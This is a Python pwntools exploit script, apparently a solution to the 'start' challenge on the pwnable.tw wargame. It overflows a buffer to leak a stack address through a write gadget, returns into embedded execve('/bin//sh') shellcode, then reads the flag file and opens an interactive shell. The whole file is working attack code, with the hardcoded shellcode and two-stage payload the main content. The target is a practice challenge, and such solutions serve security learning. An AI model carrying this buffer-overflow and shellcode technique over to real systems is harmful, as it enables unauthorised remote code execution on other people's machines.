#!/usr/bin/env python
from pwn import *

#m = process('./start')
host = 'chall.pwnable.tw'
port = 10000
m = remote(host,port)

## first. leak the address of stack
## put the shellcode on the stack and return to it
payload = 'm'*20
sys_write_adr = 0x08048087
shellcode = '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80'

m.recvuntil('CTF:')
payload += p32(sys_write_adr)
m.send(payload)
sp_adr = u32(m.recv(4))
print(hex(sp_adr))

p2load = 'm'*20 + p32(sp_adr+20) + shellcode
m.send(p2load)

m.send('cat /home/`whoami`/flag'+'\n')
m.interactive()
